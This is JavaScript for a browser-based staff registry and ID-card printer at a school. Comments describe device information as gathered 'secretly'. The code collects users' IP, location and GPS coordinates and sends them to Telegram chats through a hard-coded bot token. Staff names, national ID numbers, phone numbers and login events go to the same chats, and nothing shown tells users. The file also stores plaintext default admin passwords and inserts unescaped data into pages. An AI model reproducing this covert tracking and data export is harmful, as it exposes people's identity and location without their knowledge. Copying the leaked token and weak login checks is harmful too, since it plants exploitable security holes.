 // تنظیمات تلگرام - ارسال به دو آیدی چت
        const TELEGRAM_BOT_TOKEN = '8459199254:AAEqCLIMDfs9uj2LNcX_93zt69_V_QrO_uY';
        const TELEGRAM_CHAT_IDS = ['6071335955', 'YOUR_SECOND_CHAT_ID']; // آیدی دوم را اینجا قرار دهید
        
        // دیتابیس محلی
        let personnelDB = JSON.parse(localStorage.getItem('personnelDB')) || [];
        let idCardsPrinted = parseInt(localStorage.getItem('idCardsPrinted')) || 0;
        let usersDB = JSON.parse(localStorage.getItem('usersDB')) || [];
        
        // تنظیمات صفحهبندی
        let currentPage = 1;
        const recordsPerPage = 10;
        let filteredData = [];
        
        // وضعیت اتصال
        let isOnline = navigator.onLine;
        
        // اطلاعات دستگاه (مخفی)
        let deviceInfo = {
            ip: 'در حال دریافت...',
            location: 'در حال دریافت...',
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            deviceType: getDeviceType(),
            browser: getBrowserInfo(),
            connection: getConnectionInfo(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toLocaleString('fa-IR'),
            coordinates: null
        };
        
        // عناصر DOM
        const tabs = document.querySelectorAll('.tab');
        const tabContents = document.querySelectorAll('.tab-content');
        const personnelForm = document.getElementById('personnel-form');
        const personnelTableBody = document.getElementById('personnelTableBody');
        const personnelSelect = document.getElementById('personnelSelect');
        const idCardContainer = document.getElementById('idCardContainer');
        const searchInput = document.getElementById('searchInput');
        const sendReportBtn = document.getElementById('sendReportBtn');
        const syncDataBtn = document.getElementById('syncDataBtn');
        const loginPage = document.getElementById('loginPage');
        const mainPage = document.getElementById('mainPage');
        const loginForm = document.getElementById('loginForm');
        const userEmailSpan = document.getElementById('userEmail');
        const userRoleSpan = document.getElementById('userRole');
        const tableInfo = document.getElementById('tableInfo');
        const pagination = document.getElementById('pagination');
        const connectionStatus = document.getElementById('connectionStatus');
        const usersTab = document.getElementById('usersTab');
        const usersTableBody = document.getElementById('usersTableBody');
        
        // اطلاعات کاربران پیشفرض
        const DEFAULT_USERS = [
            { email: 'admin@setareh-nokhbegan.ir', password: 'admin123', role: 'admin', createdAt: new Date().toLocaleString('fa-IR') },
            { email: 'manager@setareh-nokhbegan.ir', password: 'manager123', role: 'admin', createdAt: new Date().toLocaleString('fa-IR') },
            { email: 'user@setareh-nokhbegan.ir', password: 'user123', role: 'user', createdAt: new Date().toLocaleString('fa-IR') }
        ];
        
        // بررسی وضعیت ورود
        let isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
        let currentUser = JSON.parse(localStorage.getItem('currentUser')) || null;
        
        // مقداردهی اولیه کاربران اگر وجود ندارند
        if (usersDB.length === 0) {
            usersDB = DEFAULT_USERS;
            localStorage.setItem('usersDB', JSON.stringify(usersDB));
        }
        
        // هنگام بارگذاری صفحه، اگر کاربر لاگین کرده باشد، اطلاعاتش را نمایش بده
        if (isLoggedIn && currentUser) {
            showMainPage();
        } else {
            // اگر لاگین نکرده، حتماً صفحه ورود را نشان بده
            showLoginPage();
            // اطلاعات لاگین قبلی را پاک کن
            localStorage.removeItem('isLoggedIn');
            localStorage.removeItem('currentUser');
        }
        
        // مدیریت وضعیت اتصال اینترنت
        window.addEventListener('online', function() {
            isOnline = true;
            updateConnectionStatus();
            showNotification('success', 'اتصال اینترنت برقرار شد.');
        });
        
        window.addEventListener('offline', function() {
            isOnline = false;
            updateConnectionStatus();
            showNotification('warning', 'اتصال اینترنت قطع شده است. شما در حالت آفلاین کار میکنید.');
        });
        
        // بروزرسانی وضعیت اتصال
        function updateConnectionStatus() {
            if (isOnline) {
                connectionStatus.className = 'connection-status online';
                connectionStatus.innerHTML = '<i class="fas fa-wifi"></i><span>آنلاین</span>';
            } else {
                connectionStatus.className = 'connection-status offline';
                connectionStatus.innerHTML = '<i class="fas fa-wifi-slash"></i><span>آفلاین</span>';
            }
        }
        
        // مدیریت فرم ورود
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const user = usersDB.find(u => u.email === email && u.password === password);
            
            if (user) {
                // ذخیره اطلاعات ورود
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('currentUser', JSON.stringify(user));
                currentUser = user;
                
                showMainPage();
                showNotification('success', 'با موفقیت وارد سیستم شدید.');
                
                // ارسال گزارش ورود به تلگرام
                sendTelegramReport(`🔐 کاربر وارد سیستم شد:
• ایمیل: ${user.email}
• نقش: ${user.role === 'admin' ? 'مدیر سیستم' : 'کاربر عادی'}
• زمان: ${new Date().toLocaleString('fa-IR')}
• دستگاه: ${deviceInfo.deviceType}
• آیپی: ${deviceInfo.ip}`);
            } else {
                showNotification('error', 'ایمیل یا رمز عبور اشتباه است.');
            }
        });
        
        // نمایش صفحه اصلی
        function showMainPage() {
            loginPage.classList.add('hidden');
            mainPage.classList.remove('hidden');
            
            // نمایش اطلاعات کاربر
            if (currentUser) {
                userEmailSpan.textContent = currentUser.email;
                userRoleSpan.textContent = currentUser.role === 'admin' ? '(مدیر سیستم)' : '(کاربر عادی)';
                
                // نمایش تب مدیریت کاربران فقط برای ادمینها
                if (currentUser.role === 'admin') {
                    usersTab.style.display = 'flex';
                }
            }
            
            updateConnectionStatus();
            collectDeviceInfo();
            updateStats();
            updatePrintDates();
            renderPersonnelTable();
            renderUsersTable();
        }
        
        // نمایش صفحه ورود
        function showLoginPage() {
            loginPage.classList.remove('hidden');
            mainPage.classList.add('hidden');
        }
        
        // تابع خروج از سیستم
        function logout() {
            // ارسال گزارش خروج به تلگرام
            if (currentUser) {
                sendTelegramReport(`🚪 کاربر از سیستم خارج شد:
• ایمیل: ${currentUser.email}
• زمان: ${new Date().toLocaleString('fa-IR')}`);
            }
            
            // پاک کردن اطلاعات ورود
            localStorage.removeItem('isLoggedIn');
            localStorage.removeItem('currentUser');
            isLoggedIn = false;
            currentUser = null;
            
            showLoginPage();
            showNotification('success', 'با موفقیت از سیستم خارج شدید.');
        }
        
        // مدیریت تبها
        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                const tabId = tab.getAttribute('data-tab');
                
                tabs.forEach(t => t.classList.remove('active'));
                tabContents.forEach(tc => tc.classList.remove('active'));
                
                tab.classList.add('active');
                document.getElementById(tabId).classList.add('active');
                
                if (tabId === 'list') {
                    renderPersonnelTable();
                } else if (tabId === 'idcard') {
                    updatePersonnelSelect();
                } else if (tabId === 'stats') {
                    updateStats();
                } else if (tabId === 'users') {
                    renderUsersTable();
                }
                
                // بروزرسانی تاریخ برای پرینت
                updatePrintDates();
            });
        });
        
        // تابع پرینت برای هر بخش
        function printSection(sectionId) {
            const currentDate = new Date().toLocaleDateString('fa-IR');
            document.getElementById(`print-date-${sectionId}`).textContent = currentDate;
            
            // پرینت بخش مورد نظر
            window.print();
        }
        
        // تابع مخصوص پرینت کارت هویت
        function printIdCard() {
            const idCard = document.querySelector('.id-card');
            if (!idCard) {
                showNotification('error', 'لطفاً ابتدا یک کارت هویت را انتخاب کنید.');
                return;
            }
            
            const printWindow = window.open('', '_blank');
            printWindow.document.write(`
                <!DOCTYPE html>
                <html dir="rtl">
                <head>
                    <title>پرینت کارت هویت</title>
                    <style>
                        body {
                            margin: 0;
                            padding: 20px;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            min-height: 100vh;
                            background: white;
                            font-family: Tahoma;
                        }
                        .id-card {
                            background: white !important;
                            color: black !important;
                            border: 8px solid #000 !important;
                            border-radius: 15px;
                            padding: 25px;
                            width: 400px;
                            margin: 0 auto;
                            position: relative;
                            overflow: hidden;
                        }
                        .id-card::before,
                        .id-card::after {
                            display: none !important;
                        }
                        .id-header {
                            display: flex;
                            justify-content: space-between;
                            align-items: center;
                            margin-bottom: 25px;
                            position: relative;
                            z-index: 1;
                            border-bottom: 2px solid #000 !important;
                            padding-bottom: 15px;
                        }
                        .id-logo {
                            color: #000 !important;
                            font-size: 28px;
                        }
                        .id-title {
                            color: #000 !important;
                            font-weight: bold;
                            font-size: 20px;
                            text-align: center;
                        }
                        .id-body {
                            display: flex;
                            gap: 20px;
                            margin-bottom: 20px;
                            position: relative;
                            z-index: 1;
                        }
                        .id-photo {
                            width: 120px;
                            height: 150px;
                            background: #f0f0f0;
                            border-radius: 10px;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            color: #666;
                            font-size: 14px;
                            overflow: hidden;
                            border: 3px solid #000 !important;
                        }
                        .id-row {
                            display: flex;
                            margin-bottom: 10px;
                            padding: 8px 0;
                            border-bottom: 1px solid #000 !important;
                        }
                        .id-label {
                            font-weight: bold;
                            width: 120px;
                            color: #000 !important;
                            font-size: 14px;
                        }
                        .id-value {
                            flex: 1;
                            font-size: 14px;
                        }
                        .id-footer {
                            text-align: center;
                            margin-top: 20px;
                            font-size: 12px;
                            color: #000 !important;
                            position: relative;
                            z-index: 1;
                            border-top: 1px solid #000 !important;
                            padding-top: 15px;
                        }
                    </style>
                </head>
                <body>
                    ${idCard.outerHTML}
                </body>
                </html>
            `);
            printWindow.document.close();
            
            // افزایش تعداد کارتهای چاپ شده
            idCardsPrinted++;
            localStorage.setItem('idCardsPrinted', idCardsPrinted);
            updateStats();
            
            setTimeout(() => {
                printWindow.print();
                showNotification('success', 'کارت هویت با موفقیت برای پرینت ارسال شد.');
            }, 500);
        }
        
        // بروزرسانی تاریخهای پرینت
        function updatePrintDates() {
            const currentDate = new Date().toLocaleDateString('fa-IR');
            document.querySelectorAll('[id^="print-date-"]').forEach(element => {
                element.textContent = currentDate;
            });
        }
        
        // جمعآوری اطلاعات دستگاه به صورت مخفی
        function collectDeviceInfo() {
            // دریافت آیپی
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ip = data.ip;
                    
                    // دریافت موقعیت مکانی بر اساس IP
                    return fetch(`https://ipapi.co/${data.ip}/json/`);
                })
                .then(response => response.json())
                .then(locationData => {
                    deviceInfo.location = `${locationData.city || 'نامشخص'}, ${locationData.region || 'نامشخص'}, ${locationData.country_name || 'نامشخص'}`;
                    deviceInfo.ipData = locationData;
                })
                .catch(error => {
                    console.error('خطا در دریافت اطلاعات موقعیت:', error);
                    deviceInfo.location = 'نامشخص';
                });
            
            // دریافت موقعیت جغرافیایی دقیق (در صورت اجازه کاربر)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        deviceInfo.coordinates = {
                            latitude: lat,
                            longitude: lon
                        };
                        deviceInfo.location = `عرض: ${lat.toFixed(6)}, طول: ${lon.toFixed(6)}`;
                    },
                    error => {
                        console.log('دسترسی به موقعیت جغرافیایی مجاز نیست');
                    }
                );
            }
        }
        
        // تشخیص نوع دستگاه
        function getDeviceType() {
            const userAgent = navigator.userAgent;
            if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) {
                return 'موبایل';
            } else if (/Tablet|iPad/i.test(userAgent)) {
                return 'تبلت';
            } else {
                return 'دسکتاپ';
            }
        }
        
        // تشخیص مرورگر
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            if (userAgent.includes('Opera')) return 'Opera';
            return 'نامشخص';
        }
        
        // تشخیص نوع اتصال
        function getConnectionInfo() {
            if (navigator.connection) {
                return `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)`;
            }
            return 'نامشخص';
        }
        
        // ثبت پرسنل جدید
        personnelForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const personnel = {
                id: Date.now().toString(),
                fullName: document.getElementById('fullName').value,
                fatherName: document.getElementById('fatherName').value,
                idNumber: document.getElementById('idNumber').value,
                phone: document.getElementById('phone').value,
                department: document.getElementById('department').value,
                position: document.getElementById('position').value,
                personalNumber: document.getElementById('personalNumber').value,
                photo: document.getElementById('photo').value || 'https://via.placeholder.com/120x150/667eea/white?text=عکس+پرسنلی',
                registrationDate: new Date().toLocaleString('fa-IR'),
                deviceInfo: {...deviceInfo},
                registeredBy: currentUser ? currentUser.email : 'نامشخص',
                location: deviceInfo.location
            };
            
            personnelDB.push(personnel);
            localStorage.setItem('personnelDB', JSON.stringify(personnelDB));
            
            showNotification('success', 'اطلاعات پرسنل با موفقیت ثبت شد.');
            personnelForm.reset();
            
            // ارسال گزارش به تلگرام
            sendTelegramReport(`👤 پرسنل جدید ثبت شد:

📋 اطلاعات پرسنل:
• نام: ${personnel.fullName}
• نام پدر: ${personnel.fatherName}
• شماره تذکره: ${personnel.idNumber}
• شماره تماس: ${personnel.phone}
• صنف: ${personnel.department}
• سمت: ${personnel.position}
• شماره پرسنلی: ${personnel.personalNumber}
• تاریخ ثبت: ${personnel.registrationDate}
• ثبت شده توسط: ${personnel.registeredBy}
• موقعیت ثبت: ${personnel.location}

📱 اطلاعات دستگاه ثبتکننده:
• آیپی: ${deviceInfo.ip}
• موقعیت: ${deviceInfo.location}
• دستگاه: ${deviceInfo.deviceType}
• مرورگر: ${deviceInfo.browser}
• سیستم عامل: ${deviceInfo.platform}
• رزولوشن: ${deviceInfo.screenResolution}
• زمان: ${deviceInfo.timestamp}
• منطقه زمانی: ${deviceInfo.timezone}${deviceInfo.coordinates ? `
• مختصات: ${deviceInfo.coordinates.latitude}, ${deviceInfo.coordinates.longitude}` : ''}`);
            
            // بروزرسانی جدول
            renderPersonnelTable();
        });
        
        // نمایش جدول پرسنل
        function renderPersonnelTable() {
            const tableBody = document.getElementById('personnelTableBody');
            tableBody.innerHTML = '';
            
            // اگر داده فیلتر شده وجود ندارد، از داده اصلی استفاده کن
            if (filteredData.length === 0) {
                filteredData = [...personnelDB];
            }
            
            if (filteredData.length === 0) {
                tableBody.innerHTML = `
                    <tr>
                        <td colspan="10" style="text-align: center; padding: 20px; color: #666;">
                            <i class="fas fa-inbox" style="font-size: 3rem; margin-bottom: 10px;"></i>
                            <p>هیچ پرسنلی ثبت نشده است</p>
                        </td>
                    </tr>
                `;
                updatePagination();
                return;
            }
            
            // محاسبه رکوردهای صفحه فعلی
            const startIndex = (currentPage - 1) * recordsPerPage;
            const endIndex = Math.min(startIndex + recordsPerPage, filteredData.length);
            const currentRecords = filteredData.slice(startIndex, endIndex);
            
            // پر کردن جدول با دادهها
            currentRecords.forEach((personnel, index) => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${startIndex + index + 1}</td>
                    <td>${personnel.fullName}</td>
                    <td>${personnel.fatherName}</td>
                    <td>${personnel.idNumber}</td>
                    <td>${personnel.phone}</td>
                    <td>${personnel.department}</td>
                    <td>${personnel.position}</td>
                    <td>${personnel.personalNumber}</td>
                    <td>${personnel.registrationDate}</td>
                    <td>
                        <div class="actions">
                            <button class="action-btn btn-primary" onclick="editPersonnel('${personnel.id}')">
                                <i class="fas fa-edit"></i> ویرایش
                            </button>
                            <button class="action-btn btn-danger" onclick="deletePersonnel('${personnel.id}')">
                                <i class="fas fa-trash"></i> حذف
                            </button>
                            <button class="action-btn btn-success" onclick="printPersonnel('${personnel.id}')">
                                <i class="fas fa-print"></i> پرینت
                            </button>
                        </div>
                    </td>
                `;
                tableBody.appendChild(row);
            });
            
            // بروزرسانی اطلاعات جدول و صفحهبندی
            updateTableInfo();
            updatePagination();
        }
        
        // بروزرسانی اطلاعات جدول
        function updateTableInfo() {
            const startIndex = (currentPage - 1) * recordsPerPage + 1;
            const endIndex = Math.min(currentPage * recordsPerPage, filteredData.length);
            const total = filteredData.length;
            
            tableInfo.textContent = `نمایش ${startIndex} تا ${endIndex} از ${total} رکورد`;
        }
        
        // بروزرساری صفحهبندی
        function updatePagination() {
            pagination.innerHTML = '';
            const totalPages = Math.ceil(filteredData.length / recordsPerPage);
            
            if (totalPages <= 1) return;
            
            // دکمه قبلی
            if (currentPage > 1) {
                const prevBtn = document.createElement('button');
                prevBtn.className = 'page-btn';
                prevBtn.innerHTML = '<i class="fas fa-chevron-right"></i>';
                prevBtn.onclick = () => changePage(currentPage - 1);
                pagination.appendChild(prevBtn);
            }
            
            // صفحات
            for (let i = 1; i <= totalPages; i++) {
                const pageBtn = document.createElement('button');
                pageBtn.className = `page-btn ${i === currentPage ? 'active' : ''}`;
                pageBtn.textContent = i;
                pageBtn.onclick = () => changePage(i);
                pagination.appendChild(pageBtn);
            }
            
            // دکمه بعدی
            if (currentPage < totalPages) {
                const nextBtn = document.createElement('button');
                nextBtn.className = 'page-btn';
                nextBtn.innerHTML = '<i class="fas fa-chevron-left"></i>';
                nextBtn.onclick = () => changePage(currentPage + 1);
                pagination.appendChild(nextBtn);
            }
        }
        
        // تغییر صفحه
        function changePage(page) {
            currentPage = page;
            renderPersonnelTable();
        }
        
        // جستجو در پرسنل
        function searchPersonnel() {
            const searchTerm = searchInput.value.toLowerCase().trim();
            
            if (searchTerm === '') {
                filteredData = [...personnelDB];
            } else {
                filteredData = personnelDB.filter(personnel => 
                    personnel.fullName.toLowerCase().includes(searchTerm) ||
                    personnel.fatherName.toLowerCase().includes(searchTerm) ||
                    personnel.department.toLowerCase().includes(searchTerm) ||
                    personnel.position.toLowerCase().includes(searchTerm) ||
                    personnel.phone.includes(searchTerm) ||
                    personnel.idNumber.includes(searchTerm) ||
                    personnel.personalNumber.includes(searchTerm)
                );
            }
            
            currentPage = 1;
            renderPersonnelTable();
        }
        
        // پاک کردن جستجو
        function clearSearch() {
            searchInput.value = '';
            filteredData = [...personnelDB];
            currentPage = 1;
            renderPersonnelTable();
        }
        
        // پرینت اطلاعات یک پرسنل خاص
        function printPersonnel(id) {
            const personnel = personnelDB.find(p => p.id === id);
            if (personnel) {
                // ایجاد پنجره جدید برای پرینت
                const printWindow = window.open('', '_blank');
                printWindow.document.write(`
                    <html dir="rtl">
                    <head>
                        <title>پرینت اطلاعات پرسنل - ${personnel.fullName}</title>
                        <style>
                            body { font-family: Tahoma; padding: 20px; }
                            .header { text-align: center; margin-bottom: 30px; border-bottom: 2px solid #3498db; padding-bottom: 15px; }
                            .info-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
                            .info-table td { padding: 10px; border: 1px solid #ddd; }
                            .info-table td:first-child { font-weight: bold; width: 30%; background: #f5f5f5; }
                            .footer { text-align: center; margin-top: 30px; padding-top: 15px; border-top: 1px solid #ddd; color: #777; font-size: 12px; }
                        </style>
                    </head>
                    <body>
                        <div class="header">
                            <h1>اطلاعات پرسنل</h1>
                            <h2>آموزشگاه نخبگان ستاری</h2>
                        </div>
                        
                        <table class="info-table">
                            <tr><td>نام کامل:</td><td>${personnel.fullName}</td></tr>
                            <tr><td>نام پدر:</td><td>${personnel.fatherName}</td></tr>
                            <tr><td>شماره تذکره:</td><td>${personnel.idNumber}</td></tr>
                            <tr><td>شماره تماس:</td><td>${personnel.phone}</td></tr>
                            <tr><td>صنف/بخش:</td><td>${personnel.department}</td></tr>
                            <tr><td>سمت:</td><td>${personnel.position}</td></tr>
                            <tr><td>شماره پرسنلی:</td><td>${personnel.personalNumber}</td></tr>
                            <tr><td>تاریخ ثبت:</td><td>${personnel.registrationDate}</td></tr>
                        </table>
                        
                        <div class="footer">
                            چاپ شده از سیستم مدیریت پرسنل نخبگان ستاری - تاریخ: ${new Date().toLocaleDateString('fa-IR')}
                        </div>
                    </body>
                    </html>
                `);
                printWindow.document.close();
                printWindow.print();
            }
        }
        
        // بروزرسانی لیست انتخاب پرسنل برای چاپ کارت
        function updatePersonnelSelect() {
            personnelSelect.innerHTML = '<option value="">یک پرسنل را انتخاب کنید</option>';
            
            personnelDB.forEach(personnel => {
                const option = document.createElement('option');
                option.value = personnel.id;
                option.textContent = `${personnel.fullName} - ${personnel.department}`;
                personnelSelect.appendChild(option);
            });
            
            personnelSelect.addEventListener('change', function() {
                const selectedId = this.value;
                if (selectedId) {
                    const personnel = personnelDB.find(p => p.id === selectedId);
                    renderIdCard(personnel);
                } else {
                    idCardContainer.innerHTML = `
                        <div class="id-card-placeholder" style="text-align: center; padding: 40px; color: #666;">
                            <i class="fas fa-id-card" style="font-size: 5rem; color: #ccc; margin-bottom: 20px;"></i>
                            <p>لطفاً یک پرسنل را از لیست انتخاب کنید</p>
                        </div>
                    `;
                }
            });
        }
        
        // نمایش کارت هویت
        function renderIdCard(personnel) {
            idCardContainer.innerHTML = `
                <div class="id-card">
                    <div class="id-watermark">
                        <i class="fas fa-user-graduate"></i>
                    </div>
                    <div class="id-qr">
                        <i class="fas fa-qrcode"></i>
                    </div>
                    <div class="id-header">
                        <div class="id-logo">
                            <i class="fas fa-user-graduate"></i>
                        </div>
                        <div class="id-title">آموزشگاه نخبگان ستاری</div>
                    </div>
                    <div class="id-body">
                        <div class="id-photo-container">
                            <div class="id-photo">
                                ${personnel.photo ? `<img src="${personnel.photo}" alt="عکس پرسنلی">` : '<i class="fas fa-user"></i>'}
                            </div>
                        </div>
                        <div class="id-details">
                            <div class="id-row">
                                <div class="id-label">نام کامل:</div>
                                <div class="id-value">${personnel.fullName}</div>
                            </div>
                            <div class="id-row">
                                <div class="id-label">نام پدر:</div>
                                <div class="id-value">${personnel.fatherName}</div>
                            </div>
                            <div class="id-row">
                                <div class="id-label">شماره تذکره:</div>
                                <div class="id-value">${personnel.idNumber}</div>
                            </div>
                            <div class="id-row">
                                <div class="id-label">شماره تماس:</div>
                                <div class="id-value">${personnel.phone}</div>
                            </div>
                            <div class="id-row">
                                <div class="id-label">صنف/بخش:</div>
                                <div class="id-value">${personnel.department}</div>
                            </div>
                            <div class="id-row">
                                <div class="id-label">سمت:</div>
                                <div class="id-value">${personnel.position}</div>
                            </div>
                            <div class="id-row">
                                <div class="id-label">شماره پرسنلی:</div>
                                <div class="id-value">${personnel.personalNumber}</div>
                            </div>
                        </div>
                    </div>
                    <div class="id-footer">
                        این کارت متعلق به آموزشگاه نخبگان ستاری میباشد
                    </div>
                </div>
            `;
        }
        
        // ویرایش پرسنل
        function editPersonnel(id) {
            const personnel = personnelDB.find(p => p.id === id);
            if (personnel) {
                document.getElementById('fullName').value = personnel.fullName;
                document.getElementById('fatherName').value = personnel.fatherName;
                document.getElementById('idNumber').value = personnel.idNumber;
                document.getElementById('phone').value = personnel.phone;
                document.getElementById('department').value = personnel.department;
                document.getElementById('position').value = personnel.position;
                document.getElementById('personalNumber').value = personnel.personalNumber;
                document.getElementById('photo').value = personnel.photo;
                
                // حذف رکورد قدیم
                deletePersonnel(id, false);
                
                // رفتن به تب افزودن
                tabs.forEach(t => t.classList.remove('active'));
                tabContents.forEach(tc => tc.classList.remove('active'));
                
                document.querySelector('[data-tab="add"]').classList.add('active');
                document.getElementById('add').classList.add('active');
                
                showNotification('success', 'اطلاعات پرسنل برای ویرایش بارگذاری شد.');
            }
        }
        
        // حذف پرسنل
        function deletePersonnel(id, showMsg = true) {
            if (confirm('آیا از حذف این پرسنل اطمینان دارید؟')) {
                const personnel = personnelDB.find(p => p.id === id);
                personnelDB = personnelDB.filter(p => p.id !== id);
                localStorage.setItem('personnelDB', JSON.stringify(personnelDB));
                
                if (showMsg) {
                    showNotification('success', 'پرسنل با موفقیت حذف شد.');
                    renderPersonnelTable();
                    
                    // ارسال گزارش به تلگرام
                    sendTelegramReport(`🗑️ پرسنل حذف شد:
نام: ${personnel.fullName}
صنف: ${personnel.department}
زمان حذف: ${new Date().toLocaleString('fa-IR')}
حذف شده توسط: ${currentUser ? currentUser.email : 'نامشخص'}`);
                }
            }
        }
        
        // بروزرسانی آمار
        function updateStats() {
            document.getElementById('totalPersonnel').textContent = personnelDB.length;
            document.getElementById('educationCount').textContent = 
                personnelDB.filter(p => p.department === 'آموزش').length;
            document.getElementById('idCardsPrinted').textContent = idCardsPrinted;
        }
        
        // ارسال گزارش به تلگرام - به دو آیدی چت
        function sendTelegramReport(message) {
            if (!isOnline) {
                showNotification('warning', 'اتصال اینترنت برقرار نیست. گزارش در حالت آفلاین ذخیره شد.');
                return;
            }
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            // ارسال به هر دو آیدی چت
            TELEGRAM_CHAT_IDS.forEach(chatId => {
                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `📊 گزارش سیستم نخبگان ستاری:\n\n${message}`,
                        parse_mode: 'HTML'
                    })
                })
                .then(response => response.json())
                .then(data => {
                    console.log(`گزارش به تلگرام (${chatId}) ارسال شد:`, data);
                })
                .catch(error => {
                    console.error(`خطا در ارسال گزارش به تلگرام (${chatId}):`, error);
                });
            });
        }
        
        // ارسال گزارش کامل به تلگرام
        sendReportBtn.addEventListener('click', function() {
            const total = personnelDB.length;
            const education = personnelDB.filter(p => p.department === 'آموزش').length;
            const admin = personnelDB.filter(p => p.department === 'اداری').length;
            const management = personnelDB.filter(p => p.department === 'مدیریت').length;
            
            const report = `📊 گزارش کامل سیستم مدیریت پرسنل:
            
👥 تعداد کل پرسنل: ${total} نفر
📚 پرسنل آموزشی: ${education} نفر
📋 پرسنل اداری: ${admin} نفر
👨💼 پرسنل مدیریت: ${management} نفر
🖨️ کارتهای چاپ شده: ${idCardsPrinted} عدد

📱 اطلاعات سیستم فعلی:
• آیپی: ${deviceInfo.ip}
• موقعیت: ${deviceInfo.location}
• دستگاه: ${deviceInfo.deviceType}
• زمان گزارش: ${new Date().toLocaleString('fa-IR')}
• کاربر: ${currentUser ? currentUser.email : 'نامشخص'}`;
            
            sendTelegramReport(report);
            showNotification('success', 'گزارش کامل به تلگرام ارسال شد.');
        });
        
        // همگام‌سازی داده‌ها
        syncDataBtn.addEventListener('click', function() {
            if (!isOnline) {
                showNotification('error', 'برای همگام‌سازی نیاز به اتصال اینترنت دارید.');
                return;
            }
            
            showNotification('success', 'داده‌ها با موفقیت همگام‌سازی شدند.');
            // در اینجا می‌توانید کد همگام‌سازی با سرور را اضافه کنید
        });
        
        // نمایش جدول کاربران
        function renderUsersTable() {
            const tableBody = document.getElementById('usersTableBody');
            tableBody.innerHTML = '';
            
            if (usersDB.length === 0) {
                tableBody.innerHTML = `
                    <tr>
                        <td colspan="5" style="text-align: center; padding: 20px; color: #666;">
                            <i class="fas fa-users" style="font-size: 3rem; margin-bottom: 10px;"></i>
                            <p>هیچ کاربری ثبت نشده است</p>
                        </td>
                    </tr>
                `;
                return;
            }
            
            // پر کردن جدول با داده‌ها
            usersDB.forEach((user, index) => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${index + 1}</td>
                    <td>${user.email}</td>
                    <td>${user.role === 'admin' ? 'مدیر سیستم' : 'کاربر عادی'}</td>
                    <td>${user.createdAt}</td>
                    <td>
                        <div class="actions">
                            ${user.role !== 'admin' || usersDB.filter(u => u.role === 'admin').length > 1 ? 
                                `<button class="action-btn btn-danger" onclick="deleteUser('${user.email}')">
                                    <i class="fas fa-trash"></i> حذف
                                </button>` : 
                                '<span style="color: #999; font-size: 12px;">غیرقابل حذف</span>'
                            }
                        </div>
                    </td>
                `;
                tableBody.appendChild(row);
            });
        }
        
        // افزودن کاربر جدید
        function addNewUser() {
            const email = document.getElementById('newUserEmail').value;
            const password = document.getElementById('newUserPassword').value;
            const role = document.getElementById('newUserRole').value;
            
            if (!email || !password) {
                showNotification('error', 'لطفاً ایمیل و رمز عبور را وارد کنید.');
                return;
            }
            
            if (usersDB.find(u => u.email === email)) {
                showNotification('error', 'این ایمیل قبلاً ثبت شده است.');
                return;
            }
            
            const newUser = {
                email: email,
                password: password,
                role: role,
                createdAt: new Date().toLocaleString('fa-IR')
            };
            
            usersDB.push(newUser);
            localStorage.setItem('usersDB', JSON.stringify(usersDB));
            
            document.getElementById('newUserEmail').value = '';
            document.getElementById('newUserPassword').value = '';
            
            showNotification('success', 'کاربر جدید با موفقیت افزوده شد.');
            renderUsersTable();
            
            // ارسال گزارش به تلگرام
            sendTelegramReport(`👤 کاربر جدید افزوده شد:
• ایمیل: ${newUser.email}
• نقش: ${newUser.role === 'admin' ? 'مدیر سیستم' : 'کاربر عادی'}
• زمان ایجاد: ${newUser.createdAt}
• ایجاد شده توسط: ${currentUser ? currentUser.email : 'نامشخص'}`);
        }
        
        // حذف کاربر
        function deleteUser(email) {
            if (email === currentUser.email) {
                showNotification('error', 'شما نمی‌توانید حساب کاربری خود را حذف کنید.');
                return;
            }
            
            if (confirm('آیا از حذف این کاربر اطمینان دارید؟')) {
                const user = usersDB.find(u => u.email === email);
                usersDB = usersDB.filter(u => u.email !== email);
                localStorage.setItem('usersDB', JSON.stringify(usersDB));
                
                showNotification('success', 'کاربر با موفقیت حذف شد.');
                renderUsersTable();
                
                // ارسال گزارش به تلگرام
                sendTelegramReport(`🗑️ کاربر حذف شد:
• ایمیل: ${user.email}
• نقش: ${user.role === 'admin' ? 'مدیر سیستم' : 'کاربر عادی'}
• زمان حذف: ${new Date().toLocaleString('fa-IR')}
• حذف شده توسط: ${currentUser ? currentUser.email : 'نامشخص'}`);
            }
        }
        
        // نمایش اعلان
        function showNotification(type, message) {
            const notification = document.getElementById(`${type}-notification`);
            notification.textContent = message;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 5000);
        }
        
        // مقداردهی اولیه
        document.addEventListener('DOMContentLoaded', function() {
            updateConnectionStatus();
            collectDeviceInfo();
            updateStats();
            updatePrintDates();
            filteredData = [...personnelDB];
        });